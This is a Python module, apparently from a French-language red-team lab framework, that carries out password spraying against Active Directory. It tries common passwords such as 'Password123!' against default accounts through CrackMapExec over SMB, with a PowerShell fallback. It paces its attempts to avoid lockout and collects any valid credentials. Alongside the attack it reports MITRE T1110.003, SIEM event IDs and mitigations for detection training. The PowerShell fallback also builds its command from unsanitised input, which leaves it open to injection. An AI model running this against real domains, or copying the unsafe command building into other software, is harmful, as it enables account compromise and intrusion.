"""
Red Team — Password Spraying simulation.
Teste un mot de passe commun contre plusieurs comptes AD.

⚠ Lab isolé uniquement.
"""

import subprocess
import time
import os
from datetime import datetime

from utils.format_utils import print_info, print_warning, print_success, print_error

ATTACK_META = {
    "name":      "Password Spraying",
    "phase":     "Initial Access",
    "mitre":     "T1110.003",
    "risk":      "Élevé",
    "event_ids": [4625, 4648],
    "tools":     ["CrackMapExec", "Kerbrute", "PowerShell"],
}

# Mots de passe couramment testés lors d'un spray réel
DEFAULT_PASSWORDS = [
    "Password123!", "Welcome1!", "Company2024!", "Summer2024!",
    "Winter2024!", "Admin123!", "P@ssw0rd", "Azerty123!",
]

# Comptes par défaut à tester si aucune liste fournie
DEFAULT_USERS = [
    "administrator", "admin", "testuser", "jsmith",
    "john.smith", "svc_backup", "helpdesk",
]


def run_attack(target: str = "domain.local", domain: str = "domain.local",
               user_list: list = None, password_list: list = None,
               delay_s: int = 5, **kwargs) -> dict:
    """
    Simulate password spraying:
    1. Load user / password lists
    2. Try each password against all users (one password at a time)
    3. Collect valid credentials + SIEM indicators
    """
    print_warning(f"[RED TEAM] Password Spraying → {target}")

    users     = user_list     or _load_list("users.txt")    or DEFAULT_USERS
    passwords = password_list or _load_list("passwords.txt") or DEFAULT_PASSWORDS

    print_info(f"{len(users)} compte(s) × {len(passwords)} mot(s) de passe")

    findings      = []
    valid_creds   = []
    total_attempts = 0
    locked_out    = []

    for password in passwords:
        print_info(f"Spray avec : {password}")
        hits = []

        for user in users:
            result = _try_auth(domain, user, password, target)
            total_attempts += 1

            if result == "success":
                hits.append({"user": user, "password": password})
                valid_creds.append({"user": user, "password": password})
                print_success(f"  ✔ Credentials valides : {user}:{password}")
            elif result == "locked":
                if user not in locked_out:
                    locked_out.append(user)
                    print_warning(f"  ! Compte verrouillé : {user}")

        # Delay between password rounds to avoid lockout
        time.sleep(delay_s)

    # Build findings
    if valid_creds:
        findings.append({
            "risk":        "Critique",
            "title":       f"{len(valid_creds)} credential(s) valide(s) obtenu(s)",
            "description": (
                "Comptes compromis : " +
                ", ".join(f"{c['user']}:{c['password']}" for c in valid_creds[:5])
            ),
            "mitigation":  (
                "1. Réinitialiser immédiatement les mots de passe compromis.\n"
                "2. Activer la MFA sur tous les comptes.\n"
                "3. Implémenter une politique de verrouillage (≤10 tentatives).\n"
                "4. Utiliser Microsoft Entra Password Protection."
            ),
            "event_ids": [4624, 4648],
        })

    if locked_out:
        findings.append({
            "risk":        "Moyen",
            "title":       f"{len(locked_out)} compte(s) verrouillé(s) pendant l'attaque",
            "description": "Comptes : " + ", ".join(locked_out),
            "mitigation":  "Le verrouillage est un bon signe — vérifier l'alerte Event ID 4740.",
            "event_ids":   [4740],
        })

    findings.append({
        "risk":        "Info",
        "title":       f"{total_attempts} tentative(s) d'authentification générées",
        "description": (
            f"Password spraying sur {len(users)} comptes avec {len(passwords)} mots de passe. "
            f"Chaque rafale génère des Event ID 4625 visibles dans le SIEM."
        ),
        "mitigation":  "Surveiller les pics de 4625 depuis une même source IP.",
        "event_ids":   [4625],
    })

    return {
        "module":      "red_team.password_spray",
        "status":      "success",
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "valid_credentials": valid_creds,
            "locked_accounts":   locked_out,
            "total_attempts":    total_attempts,
        },
        "iocs": [
            {"type": "event_id", "value": 4625,
             "description": "Multiples échecs d'authentification (spray)"},
            {"type": "event_id", "value": 4740,
             "description": "Verrouillage de compte déclenché"},
        ],
        "summary": {
            "users_targeted":    len(users),
            "passwords_tried":   len(passwords),
            "total_attempts":    total_attempts,
            "valid_credentials": len(valid_creds),
            "locked_accounts":   len(locked_out),
        },
    }


# ── Private ───────────────────────────────────────────────────────────────────

def _try_auth(domain: str, user: str, password: str, target: str) -> str:
    """
    Attempt a single authentication.
    Returns: 'success' | 'failed' | 'locked' | 'error'
    """
    # Try CrackMapExec (SMB)
    try:
        result = subprocess.run(
            ["crackmapexec", "smb", target,
             "-u", user, "-p", password, "-d", domain],
            capture_output=True, text=True, timeout=10
        )
        out = result.stdout + result.stderr
        if "[+]" in out and "Pwn3d!" not in out:
            return "success"
        if "STATUS_ACCOUNT_LOCKED_OUT" in out:
            return "locked"
        return "failed"
    except FileNotFoundError:
        pass  # CME not installed

    # Fallback: PowerShell (Windows only)
    try:
        cmd = (
            f"$pw = ConvertTo-SecureString '{password}' -AsPlainText -Force; "
            f"$cred = New-Object System.Management.Automation.PSCredential('{domain}\\{user}', $pw); "
            f"try {{ $null = Get-ADUser -Identity {user} -Credential $cred; 'success' }} "
            f"catch [System.Security.Authentication.AuthenticationException] {{ 'failed' }} "
            f"catch {{ 'error' }}"
        )
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, text=True, timeout=15
        )
        out = res.stdout.strip().lower()
        if "success" in out:
            return "success"
        if "locked" in out:
            return "locked"
        return "failed"
    except Exception:
        return "error"


def _load_list(filename: str) -> list:
    """Load wordlist from playbooks/ directory if it exists."""
    base = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
    path = os.path.join(base, "playbooks", "wordlists", filename)
    if os.path.exists(path):
        with open(path) as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return []
